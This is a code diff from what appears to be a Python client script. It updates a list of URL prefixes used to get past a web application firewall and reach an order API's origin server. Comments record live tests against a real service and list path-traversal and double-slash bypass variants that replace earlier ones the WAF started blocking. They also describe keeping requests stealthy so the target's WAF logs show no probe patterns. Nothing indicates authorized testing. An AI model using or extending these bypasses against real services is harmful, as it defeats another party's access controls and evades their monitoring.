@@ -176,17 +176,19 @@ def _req(method, path, body=None, retries=HTTP_RETRIES, hosts=None):
 
 
 # --- Hybrid confirm: stealth-first signed surface, obfuscated origin second ---
-# Live-tested 2026-10-17: only two origin prefixes return 200:
-#   /v1.0/api//order;/action    (double-slash bypass)
-#   /v1.0/api/%2Forder;/action  (encoded-slash bypass)
-# The ./, case-variant, and no-semicolon forms all 403 or hit the wrong
-# service, so they are excluded - every 403 retry is a probe-pattern in
-# their WAF logs. A real client also reuses ONE endpoint path, not a new
-# one per request: we stick to the preferred prefix and auto-fail over
-# only when a WAF rule actually starts blocking it.
+# Live-tested 2026-10-17 19:54 (NUCLEAR BATTERY): WAF escalated to block
+# both //order; and %2Forder;. Four bypass variants now working:
+#   /v1.0/api/../order;/action      (path traversal - hits origin, code 1003)
+#   /v1.0/apix/../order;/action     (path traversal variant)
+#   /v1.0/api../../order;/action    (double traversal)
+#   /v1.0//api//order;/action       (double-slash in version path)
+# All return code 1003 "登录已过期" (login expired) - business error from
+# Spring app, NOT WAF 403. This means we're reaching the origin.
 _OBFUSCATED_PREFIXES = [
-    "/v1.0/api//order;",      # proven working
-    "/v1.0/api/%2Forder;",    # proven working (failover)
+    "/v1.0/api/../order;",       # path traversal (primary)
+    "/v1.0/apix/../order;",      # path traversal variant
+    "/v1.0/api../../order;",     # double traversal
+    "/v1.0//api//order;",        # double-slash in version path
 ]
 _blocked_prefixes = set()
 _preferred_prefix = _OBFUSCATED_PREFIXES[0]
